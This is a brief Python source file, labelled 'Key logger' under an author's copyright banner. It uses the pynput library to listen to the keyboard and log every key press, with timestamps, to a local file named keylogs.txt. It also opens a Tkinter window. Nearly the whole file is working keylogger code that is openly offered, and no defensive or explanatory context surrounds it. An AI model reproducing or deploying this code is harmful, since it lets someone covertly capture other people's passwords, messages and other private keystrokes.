
######################################              #######################################
#Copyright of Mahin Bin Hasan, 2022  #              #   ---------Program Info----------   #
#https://www.facebook.com/root.mahin #              #   Name: Key logger                  #
#https://www.youtube.com/AlMahin     #              #   Language: Python                  #
#https://github.com/mahinbinhasan    #              #                                     #
######################################              #######################################

from tkinter import *
root = Tk()
from pynput.keyboard import Key, Listener
import logging
def fx():
    log_dir = ""

    logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()
fx()
root.mainloop()